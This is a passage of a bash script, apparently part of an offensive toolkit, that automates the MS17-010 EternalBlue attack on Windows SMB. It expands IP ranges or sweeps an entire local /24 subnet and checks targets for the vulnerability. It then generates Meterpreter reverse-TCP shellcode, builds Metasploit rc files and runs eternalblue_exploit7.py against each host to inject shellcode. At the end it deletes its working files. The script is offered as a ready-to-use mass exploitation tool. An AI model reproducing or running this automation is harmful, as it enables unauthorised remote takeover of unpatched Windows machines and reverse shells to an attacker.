		head_rhosts=${rhosts%.*} > /dev/null 2>&1
		start_num=`echo $rhosts_analysis | cut -d'/' -f1` > /dev/null 2>&1
		stop_num=`echo $rhosts_analysis | cut -d'/' -f2` > /dev/null 2>&1
		if [ "$stop_num" != "" ]; then
			stop_num=`echo $stop_num` > /dev/null 2>&1
		else
			stop_num="0"
		fi
    if [[ "$rhosts_analysis" != "" ]]; then
      check_run=1
  		check_num=`expr $start_num + $stop_num` > /dev/null 2>&1
      value_check_num=`expr $start_num \* 2`
  		if [ "$check_num" = "$value_check_num" ] || [ "$check_num" = "$start_num" ]; then
        if [[ "$rhosts" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]; then
    			echo "$rhosts" >> $file_ip
        else
          check_run=0
          echo -e "${red}[-]$RESET $rhosts $not_format"
        fi
  		else
        if [[ "$head_rhosts.$start_num" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]] || [[ "$head_rhosts.$stop_num" =~ ^(([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))\.){3}([1-9]?[0-9]|1[0-9][0-9]|2([0-4][0-9]|5[0-5]))$ ]]; then
    			for (( i = $start_num ; i <= $stop_num; i++ )) do
    				new_rhosts="$head_rhosts.$i"
    				echo "$new_rhosts" >> $file_ip
    			done
        else
          check_run=0
          echo -e "${red}[-]$RESET $head_rhosts.$start_num/$stop_num $not_format"
        fi
  		fi
    else
      check_run=0
      echo -e "${red}[-]$RESET $rhosts $not_format"
    fi
	fi
fi
if [[ "$check_run" = "1" ]]; then
  echo -e "${BlueF}[*]$RESET $scan_start"
  bash checkvuln.sh -p $rport -t $timeout
  echo -e "${BlueF}[*]$RESET $scan_stop"
fi
cd $path_present
}
function module_run {
out_value
module_path_present=`pwd`
module_path_rc_file="$module_path_present/Config"
rc_file="$module_path_rc_file/file.rc"
rm -rf $rc_file > /dev/null 2>&1
touch $rc_file > /dev/null 2>&1
if [[ "$platform" = "msf" ]] || [[ "$platform" = "MSF" ]] || [[ "$platform" = "Msf" ]] || [[ "$platform" = "metasploit" ]] || [[ "$platform" = "Metasploit" ]] || [[ "$platform" = "1" ]]; then
  echo "use exploit/windows/smb/eternalblue_doublepulsar" >> $rc_file
else
   echo "use multi/handler" >> $rc_file
fi
}
function attack {
#####################
path_present=`pwd`
cd $path_present/../../output
output_file=`pwd`
###################
path_tool="$output_file/../Tools/Vulnerability-Exploit/MS17-010/"
cd $path_tool
file_ip="ip.txt"
file_attack_ip="attack_ip.txt"
rm -rf $file_ip > /dev/null 2>&1
touch $file_ip > /dev/null 2>&1
if [[ "$automod_value" = "on" ]]; then
	attack_ips=`cat $file_attack_ip`
	if [[ "$attack_ips" = "" ]]; then
		head_rhosts=${lhost%.*} > /dev/null 2>&1
		for (( i = 0 ; i <= 255; i++ )) do
			new_rhosts="$head_rhosts.$i"
			echo "$new_rhosts" >> $file_ip
		done
		echo -e "${BlueF}[!]$RESET"
		bash checkvuln.sh -p $rport -t $timeout
		attack_ips=`cat $file_attack_ip`
	fi
	paylo="windows/meterpreter/reverse_tcp"
	if [[ "$attack_ips" != "" ]]; then
		echo -e "${BlueF}[!]$RESET"
		bash shellcode.sh -h $lhost -p $lport -l "None" -s $paylo -a $rarch
        echo "set LHOST $lhost" >> $rc_file
        echo "set LPORT $lport" >> $rc_file
        echo "exploit -j -z" >> $rc_file
        service postgresql start
        while IFS= read -r rhosts
        do
        	echo "xterm -title \"=> Inject shellcode on target machine <=\" -e python eternalblue_exploit7.py $rhosts $rport $smbuser $smbpass sc.bin $numgroomconn" >> Launched-Attack.sh
        done < $file_attack_ip
        chmod 755 Launched-Attack.sh
        echo -e "${BlueF}[!]$RESET $msf_start ${red}Metasploit Framework${RESET}"
        msfconsole -r $rc_file -x "bash Launched-Attack.sh;cd ../../../Victim"
        rm $path_tool/*.bin > /dev/null 2>&1
        rm $path_tool/Launched-Attack.sh > /dev/null 2>&1
        rm $path_tool/$file_ip > /dev/null 2>&1
        rm $path_tool/$file_attack_ip > /dev/null 2>&1
        service postgresql stop
        killall xterm > /dev/null 2>&1
        cd $path_present
	else
	  echo -e "${red}[-]$RESET $yout_sure"
	  cd $path_present
	fi
else
	attack_ips=`cat $file_attack_ip`
	# if [[ "$attack_ips" = "" ]]; then
		
	# fi


	if [[ "$attack_ips" != "" ]]; then
	  if [[ "$platform" = "python" ]] || [[ "$platform" = "PYTHON" ]] || [[ "$platform" = "Python" ]] || [[ "$platform" = "py" ]] || [[ "$platform" = "Py" ]] || [[ "$platform" = "0" ]]; then
	    if [[ "$paylo" != "" ]]; then
	      if [[ "$rarch" = "x86" ]] || [[ "$rarch" = "x64" ]]; then
	        bash shellcode.sh -h $lhost -p $lport -l "None" -s $paylo -a $rarch
	        echo "set LHOST $lhost" >> $rc_file
	        echo "set LPORT $lport" >> $rc_file
	        echo "exploit -j -z" >> $rc_file
	        service postgresql start
	        echo "xterm -title \"=> Inject shellcode on target machine <=\" -e python eternalblue_exploit7.py $rhosts $rport $smbuser $smbpass sc.bin $numgroomconn" > Launched-Attack.sh
	        chmod 755 Launched-Attack.sh
	        echo -e "${BlueF}[!]$RESET $msf_start ${red}Metasploit Framework${RESET}"
	        msfconsole -r $rc_file -x "bash Launched-Attack.sh;cd ../../../Victim"
	        rm $path_tool/*.bin > /dev/null 2>&1
	        rm $path_tool/Launched-Attack.sh > /dev/null 2>&1
	        rm $path_tool/$file_ip > /dev/null 2>&1
	        rm $path_tool/$file_attack_ip > /dev/null 2>&1
	        service postgresql stop
	        killall xterm > /dev/null 2>&1
	        cd $path_present
	      else
	        bash shellcode.sh -h $lhost -p $lport1 -l $lport2 -s $paylo -a $rarch
	        echo "set payload $paylo1" >> $rc_file
	        echo "set LHOST $lhost" >> $rc_file
	        echo "set LPORT $lport1" >> $rc_file
	        echo "set EXITFUNC $exitfunc" >> $rc_file
	        echo "set LURI $luri" >> $rc_file
	        echo "exploit -j -z" >> $rc_file
	        echo "" >> $rc_file
	        echo "use multi/handler" >> $rc_file
	        echo "set payload $paylo2" >> $rc_file
	        echo "set LHOST $lhost" >> $rc_file
	        echo "set LPORT $lport2" >> $rc_file
	        echo "set EXITFUNC $exitfunc" >> $rc_file
	        echo "set LURI $luri" >> $rc_file
	        echo "exploit -j -z" >> $rc_file
	        service postgresql start
	        echo "xterm -title \"=> Inject shellcode on target machine <=\" -e python eternalblue_exploit7.py $rhosts $rport $smbuser $smbpass sc.bin $numgroomconn" > Launched-Attack.sh
	        chmod 755 Launched-Attack.sh
	        echo -e "${BlueF}[!]$RESET $msf_start ${red}Metasploit Framework${RESET}"
	        msfconsole -r $rc_file -x "bash Launched-Attack.sh;cd ../../../Victim"
	        rm $path_tool/*.bin > /dev/null 2>&1
	        rm $path_tool/Launched-Attack.sh > /dev/null 2>&1
	        rm $path_tool/$file_ip > /dev/null 2>&1
	        rm $path_tool/$file_attack_ip > /dev/null 2>&1
	        service postgresql stop
	        killall xterm > /dev/null 2>&1
	        cd $path_present
	      fi
	    else
	      echo -e "${red}[-]$RESET not_payloads"
	    fi
	  else
	    echo "set DOUBLEPULSARPATH $DOUBLEPULSARPATH" >> $rc_file
	    echo "set ETERNALBLUEPATH $ETERNALBLUEPATH" >> $rc_file
	    echo "set PROCESSINJECT $PROCESSINJECT" >> $rc_file
	    echo "set TARGETARCHITECTURE $RARCH" >> $rc_file
	    echo "set WINEPATH $WINEPATH" >> $rc_file
	    echo "set RHOSTS $rhosts" >> $rc_file
	    echo "set RPORT $rport" >> $rc_file
	    echo "set LHOST $lhost" >> $rc_file
	    echo "set LPORT $lport" >> $rc_file
	    echo "set TARGET $target"
	    echo "exploit -j -z" >> $rc_file
	    service postgresql start
	    cd ../../../Victim
	    echo -e "${BlueF}[!]$RESET $msf_start ${red}Metasploit Framework${RESET}"
	    msfconsole -r $rc_file
	    service postgresql stop
	    cd $path_present
	  fi
	else
	  echo -e "${red}[-]$RESET $yout_sure"
	  cd $path_present
	fi
fi
}
function payload_name {
	payload="windows/x86/meterpreter/reverse_tcp"
}
